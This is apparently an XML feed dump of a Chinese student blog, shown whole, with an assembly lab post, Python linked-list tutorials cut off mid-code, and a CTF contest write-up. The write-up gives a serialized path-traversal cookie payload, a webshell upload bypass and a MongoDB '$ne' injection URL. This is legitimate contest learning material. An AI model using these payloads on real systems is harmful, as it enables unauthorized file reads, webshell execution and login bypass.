AL</span><br><span class="line">  JMP Go </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">EXIT:</span><br><span class="line">  HLT</span><br><span class="line"></span><br><span class="line">CODE ENDS</span><br><span class="line">END START</span><br></pre></td></tr></table></figure><p>这个4*4说来就很水，很大一部分抄的书，只是最后那里换了查七段表而已</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>1.各种控制字段记得还不够熟悉，有时还是需要翻书。。<br>2.各种器件的名字及功能原理记得也不牢固，昨天翻书发现原理的部分，还是很有欠缺的<br>3.硬件方面不行，软件方面也不行，汇编语言还是不够熟练，特别是对于逻辑判断和跳转顺序的编写，下次要不把<code>74ls138</code>端口换一换？在尝试自己写。。说来说去都是自己理论知识不扎实，下午赶紧找时间去恶补了</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;实验说简单不简单说难也不难。。最主要是自己理论不扎实，得记录，昨天把安恒6月赛的wp写完头疼，于是就放到今天赶脚写一写，注意的点都在代码的注释里面标着，趁着自己还记得emmm&lt;br&gt;
    
    </summary>
    
      <category term="编程语言" scheme="0verwatch.top/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
      <category term="微机实验" scheme="0verwatch.top/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/%E5%BE%AE%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
    
    
      <category term="汇编" scheme="0verwatch.top/tags/%E6%B1%87%E7%BC%96/"/>
    
      <category term="微机实验" scheme="0verwatch.top/tags/%E5%BE%AE%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>安恒6月赛部分做题记录</title>
    <link href="0verwatch.top/2018/06/23/anheng-6month/"/>
    <id>0verwatch.top/2018/06/23/anheng-6month/</id>
    <published>2018-06-23T13:30:09.000Z</published>
    <updated>2018-06-23T13:32:12.475Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次比赛恰逢别的学校考试，感觉题目有点水，但还是得记录一下<br><a id="more"></a></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="Web1-Mynote"><a href="#Web1-Mynote" class="headerlink" title="Web1 Mynote"></a>Web1 Mynote</h3><p>这道题目一开始我死扣xss发现无路可循后面经别人小小提醒之后，原来是个炒鸡弱智的反序列化题目，不多说<br>上图，在<code>robots.txt</code>里面发现几个可疑的页面，可能有用先记录着，直接访问<code>flag.php</code>是个假的flag。。<br><img src="https://s1.ax1x.com/2018/06/23/P9MVuq.png" alt="P9MVuq.png"></p><p>经过别人的提示，是反序列化以后，多抓几个包看一下<br>在<code>upload页面</code>上传图片文件，然后返回查看图片的页面发现里面多了一个关于<code>picture</code>参数的<code>cookie</code><br><img src="https://s1.ax1x.com/2018/06/23/P9MebV.png" alt="P9MebV.png"></p><p>解码发现是个<code>json格式</code>的东西<br><a href="https://imgchr.com/i/P9MuUU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/06/23/P9MuUU.md.png" alt="P9MuUU.md.png"></a><br>这就跟反序列化联系起来了，这是一个数组类型的反序列化但直接反序列化会有报错，如下<br><img src="https://s1.ax1x.com/2018/06/23/P9MK5F.png" alt="P9MK5F.png"><br>发现是在当前目录用的函数读取页面，于是就要目录穿越一波，于是便有了下面的操作</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"> $a[] = <span class="string">'../../controllers/Basecontrol.php'</span>;</span><br><span class="line"> $b[] = <span class="string">'../../flag.php'</span>;</span><br><span class="line"> $c[] = <span class="string">'../../controllers/User.php'</span>;</span><br><span class="line"> $d[] = <span class="string">'../../controllers/Controllers.php.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize($a)));</span><br></pre></td></tr></table></figure><p>把他们一个个弄到<code>picture</code>的<code>cookie</code>里面，把回显出来的<code>base64编码</code>一遍遍解码，得到源码，起初一直以为后续还要代码审计。。。结果解码flag.php的源码的时候出现了真的<code>flag</code>。。。。。尼玛坑爹，都做好审计准备了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$flag = <span class="string">"flag&#123;N4me_sPac4_Is_Int3r3st1ng&#125;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag&#123;This_1S_A_F4ke_f1aG&#125;"</span>;</span><br></pre></td></tr></table></figure><p>以后看来要勤抓包</p><h3 id="Web2-ezupload"><a href="#Web2-ezupload" class="headerlink" title="Web2 ezupload"></a>Web2 ezupload</h3><p>简单的上传题目<br>先随意上传一个文件发现只能上传图片，那我就用copy命令弄一个图片马上去<br>上传发现<br><img src="https://s1.ax1x.com/2018/06/23/P9MQC4.png" alt="P9MQC4.png"><br>出现路径，网页可以打开，但这个后缀名有点奇怪于是我继续尝试改后缀名为<code>phtml</code>,发现名称又变成了<code>pegml</code><br><img src="https://s1.ax1x.com/2018/06/23/P9M129.png" alt="P9M129.png"><br>于是猜测是否可能是之过滤前三个字母后缀名，这样就可以利用<code>Apache</code>的特性让他执行php代码，于是我把后缀名再改为<code>phtml.php</code>,这次的后缀名变成<code>pegml.php</code>前面的东西<code>Apache</code>肯定不认得，只能乖乖执行PHP了。。<br>于是连一下菜刀成功<br><a href="https://imgchr.com/i/P9M3vR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/06/23/P9M3vR.md.png" alt="P9M3vR.md.png"></a></p><h3 id="Web3-never-give-up"><a href="#Web3-never-give-up" class="headerlink" title="Web3 never give up"></a>Web3 never give up</h3><p>这个题目是<code>mongdb注入</code>，好像大神们都做过啊，就我这渣渣没见过。。。。直接贴图<br><img src="https://s1.ax1x.com/2018/06/23/P9MJDx.png" alt="P9MJDx.png"></p><p>查看页面原代码发现几个页面有<code>title参数</code>，就是他了<br><code>payload</code>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.71.29.5:10000/?title[$ne]=1</span><br></pre></td></tr></table></figure></p><p>原因好像是$ne这个东西有缺陷，<br>此类攻击是在条件语句中注入代码,使生成的表达式判定结果永远为真,从而绕过认证或访问机制<br>因为<code>$ne</code>是<code>MongoDB</code>用来判定条件是否不相等的,所以它会查询登录集合中的所有用户名称不等于1且密码也不等于1的记录。因此,本次查询将返回登录集合中的所有用户。换成SQL的表述法,就等同于以下查询语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> logins <span class="keyword">WHERE</span> username &lt;&gt;   <span class="number">1</span> <span class="keyword">AND</span> <span class="keyword">password</span> &lt;&gt; <span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><p>简单讲讲吧，我有点懒就不想多说了<br>两个题目流量分析题目的思路都是一致的先找到应用层的每一次会话，然后在响应里面找到对应的传送信息，两个题目都是图片。。<br><a href="https://imgchr.com/i/P9MNVK" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/06/23/P9MNVK.md.png" alt="P9MNVK.md.png"></a></p><p>这是其中一个包里面的图片，直接利用<code>html</code>的功能就好<br><img src="https://s1.ax1x.com/2018/06/23/P9Ma5D.png" alt="P9Ma5D.png"><br>得到flag</p><p>另外一个包直接选择分组字节流提取出来直接保存为图片就好,然后<code>notepad++</code>打开，最后一行就是flag<br><img src="https://s1.ax1x.com/2018/06/23/P9M6qP.png" alt="P9M6qP.png"></p><p>最后一题Misc好像是某一个比赛的原题。。。flag也没改，考了一波音频里面藏水印，加一次图片的伸缩，本人电脑没有<code>MATLAB</code>就不弄了</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>做完这题目下午做微机实验汇编懵得一批。。。。。。头晕</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这次比赛恰逢别的学校考试，感觉题目有点水，但还是得记录一下&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="Misc" scheme="0verwatch.top/tags/Misc/"/>
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>数据结构复习二 双向链表(python实现)</title>
    <link href="0verwatch.top/2018/06/17/python-DataStruct-2/"/>
    <id>0verwatch.top/2018/06/17/python-DataStruct-2/</id>
    <published>2018-06-17T15:40:35.000Z</published>
    <updated>2018-06-23T13:32:50.055Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p> 端午假期差不多结束了，感觉离暑假又靠近了，好像我们学校放假比较晚，还是别想放假的事情了，我还是乖乖去复习我的概率(求二重积分全都忘光了，重新拿起高数奋斗)，<br> <a id="more"></a>微机(实验写汇编对指令不熟)，计网(子网跟超网的题目还不熟练)，双向链表其实就是比单向链表的节点多了一个前驱结点的部分，虽然简单但是还是在编写时出现问题，出现问题就值得去记录</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>双向链表的实现，这个双向链表比昨天写的多了一点点而而已，头结点的前驱节点默认是<code>None</code>，而且在遍历，搜索以及判空等步骤都是与昨天的写法一样，可以直接尝试<code>import</code>一下昨天的文件，让今天的双向链表继承昨天的单向链表的相同操作<br>(python 3.5实现)</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, elem)</span>:</span></span><br><span class="line">        self.elem = elem</span><br><span class="line">        self.next = <span class="keyword">None</span></span><br><span class="line">        self.prev = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DoubleLinkList</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, node=None)</span>:</span> <span class="comment">#这里默认第一个节点的前驱指针指的是None</span></span><br><span class="line">        self.__head = node <span class="comment">#私有化</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_empty</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.__head <span class="keyword">is</span> <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">length</span><span class="params">(self)</span>:</span></span><br><span class="line">        cur = self.__head</span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> cur <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            cur = cur.next</span><br><span class="line">        <span class="keyword">return</span> count</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">travel</span><span class="params">(self)</span>:</span></span><br><span class="line">        cur = self.__head</span><br><span class="line">        <span class="keyword">while</span> cur <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            print(cur.elem, end=<span class="string">" "</span>)</span><br><span class="line">            cur = cur.next  <span class="comment">#这两句话顺序不能调换</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##其实上面的都不用改</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(self, item)</span>:</span></span><br><span class="line">        node = Node(item)</span><br><span class="line">        node.next = self.__head</span><br><span class="line">        self.__head = node</span><br><span class="line">        <span class="keyword">if</span> node.next <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            node.next.prev = node</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">append</span><span class="params">(self,item)</span>:</span></span><br><span class="line">        node = Node(item)</span><br><span class="line">        <span class="keyword">if</span> self.is_empty():</span><br><span class="line">            self.__head = node</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cur = self.__head</span><br><span class="line">            <span class="keyword">while</span> cur.next <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">               cur = cur.next</span><br><span class="line">            node.next = cur.next</span><br><span class="line">            node.prev = cur</span><br><span class="line">            cur.next = node</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">insert</span><span class="params">(self, pos, item)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> pos &lt; <span class="number">0</span>:</span><br><span class="line">             self.add(item)</span><br><span class="line">        <span class="keyword">elif</span> pos &gt; self.length()<span class="number">-1</span>:</span><br><span class="line">            self.append(item)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            count = <span class="number">0</span></span><br><span class="line">            cur = self.__head</span><br><span class="line">            node = Node(item)</span><br><span class="line">            <span class="keyword">while</span> count &lt; pos:</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">                cur = cur.next</span><br><span class="line">            node.next = cur</span><br><span class="line">            node.prev = cur.prev</span><br><span class="line">            cur.prev.next = node</span><br><span class="line">            cur.prev = node</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(self, item)</span>:</span></span><br><span class="line">        cur = self.__head</span><br><span class="line">        <span class="keyword">while</span> cur <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">if</span> cur.elem == item:</span><br><span class="line">                <span class="keyword">if</span> cur == self.__head:</span><br><span class="line">                    <span class="comment"># 判断链表是否只有一个节点,不是的话就执行这一条件语句</span></span><br><span class="line">                    self.__head = <span class="keyword">None</span></span><br><span class="line">                    <span class="keyword">if</span> cur.next:</span><br><span class="line">                        self.__head = cur.next</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    cur.prev.next = cur.next</span><br><span class="line">                    <span class="keyword">if</span> cur.next:</span><br><span class="line">                        cur.next.prev = cur.prev</span><br><span class="line">                <span class="keyword">break</span>   <span class="comment">#注意下这里的break，不要忘了</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                cur = cur.next</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(self, item)</span>:</span></span><br><span class="line">        cur = self.__head</span><br><span class="line">        <span class="keyword">while</span> cur <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">if</span> cur.elem == item:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                cur = cur.next</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># test_1</span></span><br><span class="line">    lst = DoubleLinkList()</span><br><span class="line">    print(lst.is_empty())</span><br><span class="line">    print(lst.length())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># test_2</span></span><br><span class="line">    lst.append(<span class="number">2</span>)</span><br><span class="line">    print(lst.is_empty())</span><br><span class="line">    lst.add(<span class="number">3</span>) <span class="comment"># 3 2</span></span><br><span class="line">    lst.insert(<span class="number">1</span>, <span class="number">5</span>)   <span class="comment"># 3  1  5 2</span></span><br><span class="line">    lst.add(<span class="number">4</span>)    <span class="comment"># 4 3  5 2</span></span><br><span class="line">    lst.append(<span class="number">6</span>)  <span class="comment"># 4 3  5 2 6</span></span><br><span class="line">    print(lst.search(<span class="number">5</span>))</span><br><span class="line">    lst.travel()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># test_3</span></span><br><span class="line">    lst.remove(<span class="number">5</span>)</span><br><span class="line">    lst.remove(<span class="number">4</span>)</span><br><span class="line">    lst.remove(<span class="number">6</span>)</span><br><span class="line">    lst.travel()</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这里我记录一下我出现的几个问题<br>第一，各节点的链接操作一定要注意顺序，比如在遍历的时候进入循环后是先进行输出操作，再把指针移到下一位等等<br>第二，每一种操作都要注意考虑单个节点，是否为头结点，尾节点的问题，然后去给出一定的条件去控制，不然很容易出错，在写<code>remove操作</code>的时候我就在考虑完头结点之后就没有考虑是否为单个节点的情况，导致程序出错，<br>第三，注意<code>remove操作</code>的<code>break</code>，这一点我还是用<code>debugger功能</code>一直<code>F7 F8 F9</code>找出来的。。。就发现一直在那个函数里面不出来，一直循环才惊醒要加break，23333<br>早早睡觉，明天早起复习概率论!!!!!!</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt; 端午假期差不多结束了，感觉离暑假又靠近了，好像我们学校放假比较晚，还是别想放假的事情了，我还是乖乖去复习我的概率(求二重积分全都忘光了，重新拿起高数奋斗)，&lt;br&gt;
    
    </summary>
    
      <category term="编程语言" scheme="0verwatch.top/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    
      <category term="python" scheme="0verwatch.top/tags/python/"/>
    
      <category term="编程语言" scheme="0verwatch.top/tags/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
      <category term="数据结构" scheme="0verwatch.top/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>数据结构复习一 单链表(python实现)</title>
    <link href="0verwatch.top/2018/06/16/python-DataStruct-1/"/>
    <id>0verwatch.top/2018/06/16/python-DataStruct-1/</id>
    <published>2018-06-16T13:20:04.000Z</published>
    <updated>2018-06-16T13:29:18.546Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>复习一下数据结构，感觉生疏了，用python重新写一遍吧<br><a id="more"></a> </p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="单链表的实现"><a href="#单链表的实现" class="headerlink" title="单链表的实现"></a>单链表的实现</h3><p>这里由于python变量的特殊性，python变量相当于维护的是一个地址，不像其他语言的的变量一样要事先定义自身的类型，这就使得python实现单链表比较方便，自我感觉。。。。比如在C语言里面设定了int类型的变量，你只能够往里面存放整形数据，而且是直接对应的数据，但是python的变量类型直接是一个地址，就例如 <code>a = 20</code>, 其实这里的a存放的是20这个数的地址， 通过a就可以找到20这个数字了。。这也解释了为什么Python里面可以这样去把两个数调换，比如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a =<span class="number">20</span> </span><br><span class="line">b = <span class="number">30</span> </span><br><span class="line">a, b = b , a</span><br></pre></td></tr></table></figure><p>下面是单链表实现代码(python 3.5)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, elem)</span>:</span></span><br><span class="line">        self.elem = elem</span><br><span class="line">        self.next = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SingleLinklist</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, node=None)</span>:</span></span><br><span class="line">        self.__head = node  <span class="comment">#这里用了__来实现一定程度的私有化，因为用户一般不需要知道这个参数的存在</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_empty</span><span class="params">(self)</span>:</span>  <span class="comment">#判断是否为空</span></span><br><span class="line">        <span class="keyword">return</span> (self.__head == <span class="keyword">None</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">length</span><span class="params">(self)</span>:</span> <span class="comment">#获取长度</span></span><br><span class="line">        cur = self.__head <span class="comment">#设置游标，类似于C里面的指针</span></span><br><span class="line">        count = <span class="number">0</span> <span class="comment">#最好设置为0，不然的话下面的条件可能也看情况变化，个人感觉这样好理解</span></span><br><span class="line">        <span class="keyword">while</span> cur <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            cur = cur.next</span><br><span class="line">        <span class="keyword">return</span> count</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">travel</span><span class="params">(self)</span>:</span> <span class="comment">#遍历一遍链表，这个跟获取长度就差不多</span></span><br><span class="line">        cur = self.__head</span><br><span class="line">        <span class="keyword">while</span> cur <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            print(cur.elem,end=<span class="string">" "</span>)</span><br><span class="line">            cur = cur.next</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(self,item)</span>:</span> <span class="comment">#头插法</span></span><br><span class="line">        node = Node(item)</span><br><span class="line">        node.next = self.__head</span><br><span class="line">        self.__head = node</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">append</span><span class="params">(self,item)</span>:</span> <span class="comment">#尾插法</span></span><br><span class="line">        node = Node(item)</span><br><span class="line">        <span class="keyword">if</span> self.is_empty():</span><br><span class="line">            self.__head = node</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cur = self.__head</span><br><span class="line">            <span class="keyword">while</span> cur.next <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">                cur = cur.next</span><br><span class="line">            cur.next = node</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">insert</span><span class="params">(self, pos, item )</span>:</span> <span class="comment">#在某个位置插入数字</span></span><br><span class="line">        <span class="keyword">if</span> pos &lt; <span class="number">0</span>:</span><br><span class="line">            self.add(item)  <span class="comment"># 位置小于0的时候默认头插法</span></span><br><span class="line">        <span class="keyword">elif</span> pos&gt; self.length()<span class="number">-1</span>:</span><br><span class="line">            self.append(item) <span class="comment"># 位置大于长度，默认尾插法，所以不能使用等于号会误插</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pre = self.__head</span><br><span 